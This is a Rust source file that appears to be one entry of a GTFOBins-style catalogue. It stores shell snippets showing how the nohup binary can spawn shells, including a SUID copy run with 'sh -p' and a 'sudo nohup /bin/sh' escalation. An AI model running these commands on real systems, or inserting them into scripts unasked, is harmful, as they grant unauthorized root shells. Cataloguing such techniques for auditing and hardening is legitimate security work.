pub static BIN_NAME: &'static str = "nohup";
pub static SH_CODE: &'static str = r#"
    
    nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
"#;
pub static CMD_CODE: &'static str = r#"
    
    COMMAND='/usr/bin/id'
    nohup "$COMMAND"
    cat nohup.out
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which nohup) .

    ./nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static CMD: Code<'static> = Code { 
	title: "CMD_CODE",
	code: CMD_CODE,
	tag: Tag::CMD,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
